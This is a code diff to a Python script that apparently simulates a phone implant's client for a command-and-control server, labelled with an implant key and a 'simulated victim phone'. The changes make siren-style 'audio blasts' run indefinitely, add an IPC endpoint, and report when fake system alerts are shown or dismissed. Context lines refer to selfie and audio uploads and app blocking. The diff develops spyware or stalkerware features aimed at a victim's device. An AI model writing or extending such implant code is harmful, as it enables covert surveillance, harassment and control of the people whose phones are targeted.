@@ -43,12 +43,14 @@ if choice == "2":
     UPLOAD_SELFIE    = f"https://{raw}/api/upload-selfie"
     AUDIO_STARTED    = f"https://{raw}/audio_started"
     AUDIO_DONE       = f"https://{raw}/audio_done"
+    IPC_URL          = f"https://{raw}/ipc"
 else:
     BASE_URL         = "ws://127.0.0.1:8000/ws"
     UPLOAD_URL       = "http://127.0.0.1:8000/upload_audio"
     UPLOAD_SELFIE    = "http://127.0.0.1:8000/api/upload-selfie"
     AUDIO_STARTED    = "http://127.0.0.1:8000/audio_started"
     AUDIO_DONE       = "http://127.0.0.1:8000/audio_done"
+    IPC_URL          = "http://127.0.0.1:8000/ipc"
 
 IMPLANT_KEY = "DeltaForce2027"
 DEVICE_ID   = "SIMULATED_VICTIM_PHONE"
@@ -65,6 +67,7 @@ screen_time_minutes  = 0
 ping_interval        = 5
 audio_playing        = False   # True while an audio-blast is "playing" on device
 audio_loops_left     = 0
+audio_stop_event     = asyncio.Event()  # set this to cancel an in-progress blast
 
 last_hour_reported       = None
 last_sent_installed_apps = None
@@ -227,15 +230,21 @@ async def simulate_audio_blast(play_type: int, loops: int) -> None:
     global audio_playing, audio_loops_left
     audio_playing    = True
     audio_loops_left = loops
-    loop_count       = loops if loops > 0 else 2  # default 2 loops for display
-    wait_s           = min(3 * loop_count, 30)
+    loop_count = loops if loops > 0 else 99999  # 0 = infinite — don't auto-stop
+    wait_s     = 3 * loop_count if loops > 0 else 3600  # infinite = wait up to 1 hour
 
     safe_print(f"    [🔊] AUDIO BLAST PLAYING: type={play_type} loops={'infinite' if loops == 0 else loops}")
     await notify_audio_started(play_type)
-    await asyncio.sleep(wait_s)
+
+    audio_stop_event.clear()
+    try:
+        await asyncio.wait_for(audio_stop_event.wait(), timeout=wait_s)
+        safe_print(f"    [🔇] AUDIO BLAST STOPPED by server command")
+    except asyncio.TimeoutError:
+        safe_print(f"    [🔊] AUDIO BLAST FINISHED after ~{wait_s}s")
+
     audio_playing    = False
     audio_loops_left = 0
-    safe_print(f"    [🔊] AUDIO BLAST FINISHED after ~{wait_s}s")
     await notify_audio_done()
 
 
@@ -547,14 +556,31 @@ async def receiver(ws) -> None:
             blocked = cmd.get("apps", "")
             safe_print(f"    [i] BLOCKED APPS UPDATED: {blocked or '(none)'}")
 
-        # ── System alert (fake notification) ─────────────────────────────────
         elif task == "system_alert":
             state = cmd.get("state")
             text  = cmd.get("text", "")
             if state == 1:
                 safe_print(f"    [🔔] SYSTEM ALERT SHOWN: \"{text}\"")
+                # Notify server the alert is now visible (IPC ping)
+                try:
+                    await asyncio.to_thread(
+                        _http_post, IPC_URL,
+                        fields={"device_id": DEVICE_ID, "implant_key": IMPLANT_KEY, "event": "alert_shown"},
+                    )
+                    safe_print("    [✔] IPC: alert_shown sent to server")
+                except Exception as e:
+                    safe_print(f"    [✘] IPC alert_shown failed: {e}")
             else:
                 safe_print("    [🔕] SYSTEM ALERT DISMISSED")
+                # Notify server the alert was dismissed (IPC ping)
+                try:
+                    await asyncio.to_thread(
+                        _http_post, IPC_URL,
+                        fields={"device_id": DEVICE_ID, "implant_key": IMPLANT_KEY, "event": "alert_dismissed"},
+                    )
+                    safe_print("    [✔] IPC: alert_dismissed sent to server")
+                except Exception as e:
+                    safe_print(f"    [✘] IPC alert_dismissed failed: {e}")
 
         # ── Audio blast ───────────────────────────────────────────────────────
         elif task == "audio_blast":
@@ -568,6 +594,7 @@ async def receiver(ws) -> None:
                 loops     = 0
             type_names = {0: "stop", 1: "Siren", 2: "Alert Bells", 3: "Xylophone"}
             if play_type == 0:
+                audio_stop_event.set()  # cancels any in-progress blast coroutine
                 audio_playing = False
                 safe_print("    [🔇] AUDIO BLAST STOPPED by server command")
                 await notify_audio_done()
